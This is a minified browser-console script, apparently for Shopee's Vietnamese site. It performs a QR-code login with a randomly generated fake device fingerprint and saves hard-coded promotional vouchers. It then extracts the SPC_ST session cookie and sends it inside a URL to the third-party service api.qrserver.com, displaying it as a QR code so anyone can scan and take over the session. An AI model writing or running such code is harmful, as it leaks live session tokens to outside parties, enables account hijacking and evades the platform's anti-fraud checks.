(async()=>{const e=[{p:0x4c50bad4e9000,c:"CRMNUICLHCMT2",s:"1ed32b8e2c273ad40cea5be3591b2c5223f54394f82b47a4d6ba0d55635c3866"},{p:0x4c45747dc9000,c:"FSV-1341779053678592",s:"3faaa9ec8224e2ebed6fefbd6d9216356c072d72a525e351a219826b1cef03f9"}];document.body.innerHTML='<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#fff;font-family:sans-serif"><div id="qi"></div><p id="qs" style="font-size:32px;font-weight:bold;margin:20px">â³</p></div>';const t=e=>document.getElementById(e),o=localStorage;try{let n=o.getItem("qrcode_id"),i=o.getItem("qrcode_time");if(n&&i&&Date.now()-parseInt(i)<12e4){let i;t("qs").textContent="ğŸ“± Äang chá» quÃ©t QR...";for(let e=0;e<60&&!i;e++){await new Promise(e=>setTimeout(e,2e3));const e=await(await fetch("/api/v2/authentication/qrcode_status?qrcode_id="+encodeURIComponent(n))).json();if(e.data&&"CONFIRMED"===e.data.status){i=e.data.qrcode_token;break}if(e.data&&"EXPIRED"===e.data.status)return t("qs").textContent="â° Háº¿t háº¡n",void o.clear()}if(!i)return t("qs").textContent="â° Timeout",void o.clear();t("qs").textContent="ğŸ” Login...";const a=(document.cookie.match(/csrftoken=([^;]+)/)||[])[1]||"",r=e=>{const t=new Uint8Array(e);return crypto.getRandomValues(t),btoa(String.fromCharCode(...t))},c=r(16)+"|"+r(64)+"|"+r(12)+"|08|3";await fetch("/api/v2/authentication/qrcode_login",{method:"POST",headers:{"Content-Type":"application/json","x-csrftoken":a,"x-api-source":"pc","x-requested-with":"XMLHttpRequest","x-shopee-language":"vi"},body:JSON.stringify({qrcode_token:i,device_sz_fingerprint:c,client_identifier:{security_device_fingerprint:c}})}),t("qs").textContent="ğŸ« Saving...";let s=0;for(let t=0;t<e.length;t++){const o=e[t];0===(await(await fetch("/api/v2/voucher_wallet/save_vouchers",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({voucher_identifiers:[{promotion_id:o.p,voucher_code:o.c,signature:o.s,signature_source:0}],need_user_voucher_status:!0})})).json()).error&&s++}const d=(document.cookie.match(/SPC_ST=([^;]+)/)||[])[1];if(d){const o="https://api.qrserver.com/v1/create-qr-code/?size=500x500&data="+encodeURIComponent("SPC_ST="+d);t("qi").innerHTML='<img src="'+o+'" style="width:90vw;height:90vw;max-width:500px;max-height:500px">',t("qs").innerHTML="âœ… "+s+"/"+e.length+' voucher!<br><small style="font-size:18px;margin-top:10px;display:block">ğŸ“± QuÃ©t QR Ä‘á»ƒ láº¥y cookie</small>'}else t("qs").textContent="âœ… "+s+"/"+e.length+" voucher Ä‘Ã£ lÆ°u!";return void o.clear()}o.clear();const a=await(await fetch("/api/v2/authentication/gen_qrcode")).json();let r;o.setItem("qrcode_id",a.data.qrcode_id),o.setItem("qrcode_time",Date.now().toString()),t("qi").innerHTML='<img src="data:image/png;base64,'+a.data.qrcode_base64+'" style="width:90vw;height:90vw;max-width:500px;max-height:500px">',t("qs").textContent="ğŸ“± QuÃ©t QR";for(let e=0;e<60&&!r;e++){await new Promise(e=>setTimeout(e,2e3));const e=await(await fetch("/api/v2/authentication/qrcode_status?qrcode_id="+encodeURIComponent(a.data.qrcode_id))).json();if(e.data&&"CONFIRMED"===e.data.status)r=e.data.qrcode_token;else if(e.data&&"EXPIRED"===e.data.status)return t("qs").textContent="â° Háº¿t háº¡n",void o.clear()}if(!r)return t("qs").textContent="â° Timeout",void o.clear();t("qs").textContent="ğŸ” Login...";const c=(document.cookie.match(/csrftoken=([^;]+)/)||[])[1]||"",s=e=>{const t=new Uint8Array(e);return crypto.getRandomValues(t),btoa(String.fromCharCode(...t))},d=s(16)+"|"+s(64)+"|"+s(12)+"|08|3";await fetch("/api/v2/authentication/qrcode_login",{method:"POST",headers:{"Content-Type":"application/json","x-csrftoken":c,"x-api-source":"pc","x-requested-with":"XMLHttpRequest","x-shopee-language":"vi"},body:JSON.stringify({qrcode_token:r,device_sz_fingerprint:d,client_identifier:{security_device_fingerprint:d}})}),t("qs").textContent="ğŸ« Saving...";let h=0;for(let t=0;t<e.length;t++){const o=e[t];0===(await(await fetch("/api/v2/voucher_wallet/save_vouchers",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({voucher_identifiers:[{promotion_id:o.p,voucher_code:o.c,signature:o.s,signature_source:0}],need_user_voucher_status:!0})})).json()).error&&h++}const l=(document.cookie.match(/SPC_ST=([^;]+)/)||[])[1];if(l){const o="https://api.qrserver.com/v1/create-qr-code/?size=500x500&data="+encodeURIComponent("SPC_ST="+l);t("qi").innerHTML='<img src="'+o+'" style="width:90vw;height:90vw;max-width:500px;max-height:500px">',t("qs").innerHTML="âœ… "+h+"/"+e.length+' voucher!<br><small style="font-size:18px;margin-top:10px;display:block">ğŸ“± QuÃ©t QR Ä‘á»ƒ láº¥y cookie</small>'}else t("qs").textContent="âœ… "+h+"/"+e.length+" voucher Ä‘Ã£ lÆ°u!";o.clear()}catch(e){t("qs").textContent="âŒ "+e}})();
